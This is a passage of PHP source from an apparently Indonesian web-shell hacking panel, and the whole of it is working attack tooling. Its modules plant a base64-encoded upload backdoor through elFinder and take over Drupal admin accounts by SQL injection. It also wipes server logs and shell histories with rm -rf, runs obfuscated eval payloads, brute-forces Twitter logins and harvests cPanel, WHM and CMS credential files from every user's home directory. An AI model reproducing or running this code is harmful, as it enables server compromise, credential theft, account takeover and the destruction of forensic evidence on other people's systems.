            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'coker_log');
            curl_setopt($ch, CURLOPT_COOKIEFILE, 'coker_log');
            $data3 = curl_exec($ch);
            return $data3;
        }
        $target = explode("
", $_POST['target']);
        if ($_POST['x']) {
            foreach ($target as $korban) {
                $nama_doang = "Exorcism1337.php";
                $isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
                $decode_isi = base64_decode($isi_nama_doang);
                $encode = base64_encode($nama_doang);
                $fp = fopen($nama_doang, "w");
                fputs($fp, $decode_isi);
                echo "[!] <a href='$korban' target='_blank'>$korban</a> <br>";
                echo "# Upload[1] ......<br>";
                $url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
                $b = file_get_contents("$url_mkfile");
                $post1 = array("cmd" => "put", "target" => "l1_$encode", "content" => "$decode_isi",);
                $post2 = array("current" => "8ea8853cb93f2f9781e0bf6e857015ea", "upload[]" => "@$nama_doang",);
                $output_mkfile = ngirim("$korban", $post1);
                if (preg_match("/$nama_doang/", $output_mkfile)) {
                    echo "<font color='lime'># Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
                } else {
                    echo "<font color='red'># Upload Gagal Cok! 1 <br># Uploading 2..</font><br>";
                    $upload_ah = ngirim("$korban?cmd=upload", $post2);
                    if (preg_match("/$nama_doang/", $upload_ah)) {
                        echo "<font color='lime'># Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
                    } else {
                        echo "<font color='red'># Upload Gagal Lagi Cok! 2</font><br><br>";
                    }
                }
            }
        }

    } 

elseif ($_GET['do'] == cmsvuln) {
        @set_time_limit(0);
        @error_reporting(0);
        // Script Functions , start ..!
        function ask_exploit_db($component) {
            $exploitdb = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
            $result = @file_get_contents($exploitdb);
            if (eregi("No results", $result)) {
                echo "<center><td>Gak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";
            } else {
                echo "<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";
            }
        }
        /**************************************************************/
        /* Joomla Conf */
        function get_components($site) {
            $source = @file_get_contents($site);
            preg_match_all('{option,(.*?)/}i', $source, $f);
            preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
            preg_match_all('{/components/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~] Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $comm) {
                echo "<tr><td>$comm</td>";
                ask_exploit_db($comm);
            }
        }
        /**************************************************************/
        /* WP Conf */
        function get_plugins($site) {
            $source = @file_get_contents($site);
            preg_match_all("#/plugins/(.*?)/#i", $source, $f);
            $plugins = array_unique($f[1]);
            if (count($plugins) == 0) {
                echo "<tr><td style='border-color:white' colspan=1>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach ($plugins as $plugin) {
                echo "<tr><td>$plugin</td>";
                ask_exploit_db($plugin);
            }
        }
        /**************************************************************/
        /* Nuke's Conf */
        function get_numod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{?name=(.*?)/}i', $source, $f);
            preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i', $source, $f2);
            preg_match_all('{/modules/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $nmod) {
                echo "<tr><td>$nmod</td>";
                ask_exploit_db($nmod);
            }
        }
        /*****************************************************/
        /* Xoops Conf */
        function get_xoomod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{/modules/(.*?)/}i', $source, $f);
            $arz = array_merge($f[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $xmod) {
                echo "<tr><td>$xmod</td>";
                ask_exploit_db($xmod);
            }
        }
        /**************************************************************/
        /* Header */
        function t_header($site) {
            echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-align:left;" width="50%" cellspacing="1" cellpadding="5">';
            echo '
<tr>
<td style="border-color=white">Site : <a href="' . $site . '">' . $site . '</a></td>
<td style="border-color=white">Exploit-db</b></td>
<td style="border-color=white">Exploit it !</td>
</tr>
';
        }
        echo "<center>";
        echo '<div class="mybox" style="text-align:center">
<h1>CMS Vulnerability Scanner</h1><hr color="white">
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="site" value="http://127.0.0.1/" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="submit" style="width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center>';
        // Start Scan :P :P ...
        if ($_POST) {
            $site = strip_tags(trim($_POST['site']));
            t_header($site);
            echo $x01 = ($_POST['pilihan'] == "Wordpress") ? get_plugins($site) : "";
            echo $x02 = ($_POST['pilihan'] == "Joomla") ? get_components($site) : "";
            echo $x03 = ($_POST['pilihan'] == "Nuke's") ? get_numod($site) : "";
            echo $x04 = ($_POST['pilihan'] == "Xoops") ? get_xoomod($site) : "";
        }

}

elseif ($_GET['do'] == 'drupal') {
		echo "<center>";
        echo "<div class='mybox'>
<h1>Drupal Mass Exploiter</h1><hr color='white'><br>
<form method='post' action=''>
<textarea rows='10'class='mybox' cols='10' name='url'>
http://www.site.com
http://www.site2.com</textarea><br><br>
<input type='submit' class='kotak' style='border-color:white' name='submit' value='SIKAT!'>
</form>
</div></center>
";
        $drupal = ($_GET["drupal"]);
        if ($drupal == 'drupal') {
            $filename = $_FILES['file']['name'];
            $filetmp = $_FILES['file']['tmp_name'];
            echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";
            move_uploaded_file($filetmp, $filename);
        }
        error_reporting(0);
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'Exorcism' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
                $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
                $ctx = stream_context_create($params);
                $data = file_get_contents($url . '/user/login/', null, $ctx);
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                    $fp = fopen("exploited.txt", 'a+');
                    fwrite($fp, "Exploitied  User: Exorcism Pass: Exorcism  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, "--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<font color='lime'><b>Success:<font color='white'>Exorcism</font> Pass:<font color='white'>Exorcism</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
                } else {
                    echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
                }
            }
            $urls = explode("
", $_POST['url']);
            foreach ($urls as $url) {
                $url = @trim($url);
                echo exploit($url);
            }
        }

}


elseif($_GET['do'] == 'ports') {
    echo '<table><tr><th><center><u>Port Scanner</u></tr></th></center><td>';
    echo '<div class="content">';
    echo '<form action="" method="post">';
    
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
        $start = strip_tags($_POST['start']);
        $end = strip_tags($_POST['end']);
        $host = strip_tags($_POST['host']);
        for($i = $start; $i<=$end; $i++){
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if($fp){
                echo 'Port '.$i.' is <font color=green>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
              Host:<br> <input type="text" name="host" value="localhost"/><br /><br />
              Port start: <br><input type="text" name="start" value="0"/><br /><br />
              Port end: <br><input type="text" name="end" value="5000"/><br /><br />
              <input type="submit" value="Scan Ports" />
              </form></center><br /><br />';echo "</center>";
    echo '</div></table></td>';


}
}

elseif($_GET['do'] == 'logs') {
  	echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br>Deleting .../tmp/logs ';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history </p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history </p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout </p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs </p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log </p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs </p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log </p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp </p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs </p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log </p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm </p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp </p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp </p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE </p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog </p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp </p>';

	sleep(4);

	echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
	echo"</td></tr></table>";
}


elseif ($_GET['do'] == 'zip') {
		echo "<center>";
        echo "<div class='mybox'>";
        echo "<h1>Zip Menu</h1><hr color='white'>";
        function rmdir_recursive($dir) {
            foreach (scandir($dir) as $file) {
                if ('.' === $file || '..' === $file) continue;
                if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
                else unlink("$dir/$file");
            }
            rmdir($dir);
        }
        if ($_FILES["zip_file"]["name"]) {
            $filename = $_FILES["zip_file"]["name"];
            $source = $_FILES["zip_file"]["tmp_name"];
            $type = $_FILES["zip_file"]["type"];
            $name = explode(".", $filename);
            $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
            foreach ($accepted_types as $mime_type) {
                if ($mime_type == $type) {
                    $okay = true;
                    break;
                }
            }
            $continue = strtolower($name[1]) == 'zip' ? true : false;
            if (!$continue) {
                $message = "Itu Bukan Zip  , , GOBLOK COK";
            }
            $path = dirname(__FILE__) . '/';
            $filenoext = basename($filename, '.zip');
            $filenoext = basename($filenoext, '.ZIP');
            $targetdir = $path . $filenoext;
            $targetzip = $path . $filename;
            if (is_dir($targetdir)) rmdir_recursive($targetdir);
            mkdir($targetdir, 0777);
            if (move_uploaded_file($source, $targetzip)) {
                $zip = new ZipArchive();
                $x = $zip->open($targetzip);
                if ($x === true) {
                    $zip->extractTo($targetdir);
                    $zip->close();
                    unlink($targetzip);
                }
                $message = "<b>Sukses Cok :)</b>";
            } else {
                $message = "<b>Error Jancok :(</b>";
            }
        }
        echo '<table style="width:100%" border="1">
<div class="mybox"><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" class="kotak" name="submit" value="Upload And Unzip" />
</form><br><br></div>';
        if ($message) echo "<p>$message</p>";
        echo "<div class='mybox'><h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input type='text' name='save' value='$dir/Exorcism_backup.zip' style='width: 450px;' height='10'><br><br>
<input type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br></div>";
        if ($_POST['backup']) {
            $save = $_POST['save'];
            function Zip($source, $destination) {
                if (extension_loaded('zip') === true) {
                    if (file_exists($source) === true) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
                            $source = realpath($source);
                            if (is_dir($source) === true) {
                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
                                foreach ($files as $file) {
                                    $file = realpath($file);
                                    if (is_dir($file) === true) {
                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                    } else if (is_file($file) === true) {
                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                                    }
                                }
                            } else if (is_file($source) === true) {
                                $zip->addFromString(basename($source), file_get_contents($source));
                            }
                        }
                        return $zip->close();
                    }
                }
                return false;
            }
            Zip($_POST['dir'], $save);
            echo "Selesai , Save To <b>$save</b>";
        }
        echo "
    <div class='mybox'><h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input type='text' name='save' value='$dir/Exorcism_unzip' style='width: 450px;' height='10'><br><br>
    <input type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    </div>";
        if ($_POST['extrak']) {
            $save = $_POST['save'];
            $zip = new ZipArchive;
            $res = $zip->open($_POST['dir']);
            if ($res === TRUE) {
                $zip->extractTo($save);
                $zip->close();
                echo 'Succes , Location : <b>' . $save . '</b>';
            } else {
                echo 'Gagal Cok :( Ntahlah !';
            }
        }
        echo '</table>';
        echo "</div>";;

}

elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}

elseif($_GET['do'] == 'logout') {
	

echo '<form action="?dir=$dir&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Sad To See You Go :(';
}elseif($_GET['do'] == 'about') {
	
    echo '<center></center>';
} elseif($_GET['do'] == 'contact') {
	echo "<center><br><font size='6'>--=[ Contact Me ]=--</font><br><br>
	<table><td style='background-color: transparent;text-align:center;border: 2px lime dotted;width:300px;height:250px;'>
	<font color='white'>Telegram: <a href='https://t.me/anonyksxd'>@anonyksxd</a><br>
Instagram: <a href='https://instagram.com/shenzyy001'>@shenzyy001</a><br>
Twitter: <a href='https://twitter.com/sibersube'>@sibersube</a></font><br></tr></td></table></center>";

} elseif($_GET['do'] == 'hijack_wp')
	{
$gwtamvan="nUl6QuM4EP58VfyHOR9FipY2KYVdrjTZ5Wvb1b0hXrQfSahlErfxkcTBaSjllv9+4zha0+Vgj4tH1RnPyzMzz9iBDzzncMVnxxGlLlc9DsvJhFaeQp0t8Db319feB+t4gM91InEGNNJc5D4BAhnTiYh9RQilCSr9MApyQ/0ilnhz1gEa5RoUf2D+QfCm2/W/wHQh408ypeBGHrN7+Mj/otENnFZ+twfXfrf7c+Qaq2Dkor3b+LI/E+Z9kRQWE4sSAXF9epQwGuPeKOX5DVWW+g6PUe6AnhcM1xmdMhclDiSSWnwn0boYumHI8nweVpoVTeS9VXHurOiincaYYUykgsbK3fb6A9fbZHQL3L0Ci+OadUhS6jI4dH9eXDpTqrlBTLBZ86DUos5l5Npa1GUXkJWeShLN7jWVjMLf63h1hyUb5iJ02IFVpE8O4af+z+9pQkEAJSE6dGXYL+5OiZTHQve6KZvoIez8m8bj+hrPsdcm0qrvSNex0Jqh5WBja0vtPRrcFi/ZYmjATKkEMZUwhEvhgip1DpWtQll7u0iGA6+434fqfU8zns6HJ5JufB7dQ9AJg0asiN4HC7NTVoKXOIQIMdQqZhBYATTlRnGuFZMAQ8izKSgZ+aQmxHk2G/S8hwevIgNpfsf19vDf7e+6Yvu7u97bwe6e6T8BFyMU3yZMsb3C6pMFS8t+slpgTyNcCIkDUYJQEXB6f5nD77SUXNOcRjjQGtNg0vg8dESlEc7hnOfIoIPzcy5JM1u82Z5JjCeGWQTudU3iWCoimiZzVyGnGQqKdkXP7PNTMdU0pIqNjcnCMA7zLH/ZDtsy4fdaJPv2olKpmDTa4zhcximVxOc7oahFcypbhsUsjsMQIT5KpHPKohStfW/WjbGY5cS0D+V9zyMgxQyX79AbRZuCIVaX3Zb8zieYF/IvMerVZOETYv/q/De/JhJP0yzk9kORZ+ZtD0osm96cGXELDK1QeiVWSIYZYppIFttaxjXPK9ITeO4uuSezwKnHZcO2GHzYGJtk/OJLgWa9Q6hN2dqv3tvbtgMrGkm0R6qr3Y5vJVgVXs2nj5MvbKGw5glGnVMbC+5cYjbuKrK0vUiCxpnrLkjIrBgvziA+gcYlSQs9mpMN6udQNkq36Rj7lLNVaurKeS1G3HcS2QQhIeascFqYlE9pNhf4Tc4UWNEX8q5w6/h9ww2cppT9gR01+dV29KC6PBV2K0nw+qhyfd2WWc475Ors6ODyuO3m4vgSjPW4ukXAagj6q+uNjh34/PH4/Bg+HU4AHpA2GEawH+tAK7VNAth+BYBtBF4F4RFLqksLyPYzQAavAJJK5X0NiuWyc1YqFOt8W6tSQr5+eqrTLAdCY9uPkubEKZbfTvZzY/CGZoKL8lMxBb+yxeVoivfj8Kg544vV7x/ypGn/L+wpndLUxOr14AIPa3bjaf5GXLvEv38A";error_reporting(0);@set_time_limit(0);eval(gzinflate(str_rot13(base64_decode($gwtamvan)))); 

} elseif($_GET['do'] == 'twitterbf') {
echo "<br><center><span style='font-size:30px; color:#009900'>Twitter Multi-Account BruteForce</span></center><br>
<p dir='ltr' align='center'>
<textarea cols='42' class='area' rows='14' name='username' style='width:300px;height:130px;'>Username</textarea> 
<textarea cols='42' class='area' rows='14' name='password' style='width:300px;height:130px;'>Password</textarea><br><br><input type='submit' value='Attack Now'><br></p><br>";
if($_POST['username'] and $_POST['password']){
        #function
        function brute($user,$pass)
        {
                $ch = curl_init();      
                curl_setopt($ch, CURLOPT_URL, "https://twitter.com/intent/session/");
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "authenticity_token=&session[username_or_email]={$user}&session[password]={$pass}&remember_me=1");
                curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/34.0.1847.116"); #change with your real useragent plz
                
                # cURL - Brute Users & Password
                $login = curl_exec($ch);
                if(eregi("error notice", $login)){
                 
                
                        echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : Username : <font color='red'>$user</font>&nbsp; Incorrect Password =====>: <font color='red'>$pass</font></font></p>"; 
                }else{
                echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : [+] CRACKED SUCCESSFULLY [+]Username : <font color='green'>$user</font>&nbsp; GOOD PASSWORD =====>: <font color='green'>$pass</font></font></p>";
                }
        }
        # POSTS
        $username = explode("n", $_POST['username']);
        $password = explode("n", $_POST['password']);
        
        # Foreach Users N' Textarea
        foreach($username as $users) {
                $users = @trim($users);
        foreach($password as $pass) {
                $pass = @trim($pass);
                brute($users,$pass); }}
        # cURL
        
        }
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Unknown1337, &amp; Recoded by Err0r_HB</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by Err0r_HB</h1><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="post" style="font-size:25px;">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
</html>";
}

}

elseif($_GET['do'] == 'configv2') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("Exc_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("Exc_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_Exc) {
			$user_config_dir = "/home/$user_Exc/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_Exc/.my.cnf" => "cpanel",
					"/home/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home/$user_Exc/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_Exc/.my.cnf" => "cpanel",
					"/home1/$user_Exc/.accesshash" => "WHM-accesshash",
